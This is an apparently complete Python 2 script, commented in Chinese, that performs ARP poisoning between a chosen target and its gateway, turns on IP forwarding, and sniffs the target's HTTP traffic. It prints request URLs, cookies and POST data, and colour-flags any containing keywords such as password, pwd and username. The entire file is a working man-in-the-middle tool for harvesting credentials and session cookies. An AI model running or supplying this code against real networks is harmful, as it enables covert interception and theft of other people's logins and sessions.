# coding:utf-8

'''
ARP攻击和嗅探
created by dream9
'''
import sys
import urllib
import threading
import argparse
from scapy.all import *
from colorama import init, Fore
import scapy_http.http as HTTP
conf.verb = 0
init(autoreset=True)

# 敏感关键词
secret_key = ['command', 'email', 'keywords', 'loginid', 'loginname', 'mima', 'nickname', 'passwd', 'password', 'pwd', 'question', 'uname', 'upass', 'user', 'user_name', 'username']
# 不展示的文件
not_filter = ['.css', '.js']

# 使用说明
def usage(msg=None):
    print 'Usage: python ' + sys.argv[0] + ' host -i interface -t target -g geteway\nuse -h for help'
    sys.exit()

# 参数解析
def parse_args():
    parse = argparse.ArgumentParser()
    parse.error = usage
    parse.add_argument('host', help='current host\'s ip')
    parse.add_argument('-i', '--interface', help='the interface', required=True)
    parse.add_argument('-g', '--gateway', help='gateway ip', required=True)
    parse.add_argument('-t', '--target', help='target ip', required=True)
    args, unknown = parse.parse_known_args()
    if unknown or len(sys.argv) < 5:
        usage()
    return (args.host, args.interface, args.gateway, args.target)
    
# 设置IP转发
def set_IP_Forward():
    with open('/proc/sys/net/ipv4/ip_forward', 'w+') as f:
        val = f.readlines()[0].strip()
        if val == '0':
            f.write('1')

# 构建欺骗的数据包
def build_pkt(host, interface, gateway, target):
    host_mac = get_if_hwaddr(interface)
    target_mac = getmacbyip(target)
    geteway_mac = getmacbyip(gateway)
    
    target_pkt = ARP(hwsrc=host_mac, psrc=gateway, hwdst=target_mac, pdst=target)
    geteway_pkt = ARP(hwsrc=host_mac, psrc=target, hwdst=geteway_mac, pdst=gateway)
    
    return (geteway_pkt, target_pkt)

# 开始欺骗攻击
def poison(geteway_pkt, target_pkt, interface):
    while True:
        send(geteway_pkt, inter=2, iface=interface)
        send(target_pkt, inter=2, iface=interface)

# 获取包中的内容
def get_pkt(pkt):
    if HTTP.HTTPRequest in pkt:
        load = ''
        method = pkt['HTTP Request'].Method
        host = pkt['HTTP Request'].Host
        path = pkt['HTTP Request'].Path
        for o in not_filter:
            if o in path.lower():
                return
        cookie = pkt['HTTP Request'].Cookie
        cookie = cookie if cookie else ''
        info = '\nRequest url: [%s] %s%s\ncookie:%s' % (method, host , urllib.unquote(path), urllib.unquote(cookie))
        
        if Raw in pkt:
            load = pkt['Raw'].load
            try:
                load = urllib.unquote(unicode(load, 'utf-8'))
            except:
                load = ''
                
        if method == 'POST':
            info += '\ndata:%s\n' % load
            if load:
                for o in secret_key:
                    if o in load.lower():
                        info = Fore.RED + info
        else:
            for o in secret_key:
                if o in path.lower():
                    info = Fore.YELLOW + info
        print info

def main():
    set_IP_Forward()
    host, interface, gateway, target = parse_args()
    geteway_pkt, target_pkt = build_pkt(host, interface, gateway, target)
    
    poison_thread = threading.Thread(target=poison, args=(geteway_pkt, target_pkt, interface));
    
    print '\n[*] begin ARP poisoning......\n'
    poison_thread.start()
    
	# 过滤的表达式
    bpf_filter = 'tcp and ip host %s' % target
    pkts = sniff(prn=get_pkt, filter=bpf_filter, iface=interface)
    
if __name__ == '__main__':
    main()
    
